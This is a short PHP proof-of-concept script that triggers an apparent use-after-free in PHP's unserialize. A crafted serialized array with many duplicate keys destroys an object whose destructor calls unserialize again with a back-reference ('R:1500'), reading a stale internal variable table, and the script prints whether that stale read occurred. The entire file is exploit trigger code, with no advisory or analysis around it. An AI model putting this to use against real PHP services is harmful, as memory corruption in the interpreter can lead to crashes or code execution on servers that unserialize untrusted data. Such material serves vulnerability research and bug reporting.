<?php
class TriggerUAF {
    public function __destruct() {
        $r = @unserialize('R:1500;');
        fwrite(STDERR, '[*] R:1500 resolved to: ' . gettype($r) . "\n");
        if ($r !== false) fwrite(STDERR, "[+] UAF behavior: stale var_hash read\n");
    }
}
$N = 2000; $p = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) $p .= "i:$i;i:$i;";
$p .= 'i:99999;O:10:"TriggerUAF":0:{}i:99999;i:42;}';
@unserialize($p);
